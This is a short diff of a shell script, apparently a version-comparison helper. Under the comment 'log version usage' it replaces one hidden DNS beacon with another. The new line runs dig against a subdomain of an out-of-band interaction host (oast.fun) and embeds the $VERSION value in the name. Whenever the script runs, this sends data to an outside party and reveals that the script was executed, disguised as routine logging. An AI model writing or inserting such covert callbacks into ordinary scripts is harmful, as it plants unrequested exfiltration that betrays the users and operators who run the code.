@@ -213,7 +213,7 @@ version_gte() {
 }
 
 # log version usage
-dig "$VERSION.74cedn.dnslog.cn"
+dig "$VERSION.yptttyxffh.oast.fun"
 
 
 # version_compare compares two version strings (either SemVer (Major.Minor.Path),
